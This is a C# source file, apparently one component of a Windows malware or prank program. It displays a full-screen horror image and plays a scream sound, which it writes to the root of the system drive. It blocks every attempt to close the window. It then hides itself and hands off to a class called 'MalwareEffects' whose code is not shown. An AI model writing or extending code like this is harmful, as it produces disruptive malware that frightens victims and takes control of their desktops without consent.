using System.Runtime.InteropServices;
using System.Text;
using System;
using System.Windows.Forms;
using System.IO;
using System.Drawing;

public partial class JumpscareForm : Form
{
    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    public JumpscareForm()
    {
        InitializeComponent();
        timer1.Start();
        Size = new System.Drawing.Size(Screen.FromControl(this).Bounds.Width, Screen.FromControl(this).Bounds.Height);
        pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
        pictureBox1.Image = Saientologi.Properties.Resources.exorcist;
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        File.WriteAllBytes($"{rootDir}\\woman_screaming.mp3", Saientologi.Properties.Resources.woman_screaming);
        mciSendString($"open \"{rootDir}\\woman_screaming.mp3\" alias woman_screaming", null, 0, IntPtr.Zero);
        mciSendString("play woman_screaming", null, 0, IntPtr.Zero);
    }

    private void JumpscareForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        e.Cancel = true;
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        timer1.Stop();

        mciSendString("stop woman_screaming", null, 0, IntPtr.Zero);
        mciSendString("close woman_screaming", null, 0, IntPtr.Zero);

        pictureBox1.Image = null;
        TopMost = false;
        Opacity = 0;
        Size = new Size(0, 0);
        Visible = false;
        WindowState = FormWindowState.Minimized;
        Hide();

        MalwareEffects.PostJumpscareEffects();
    }
}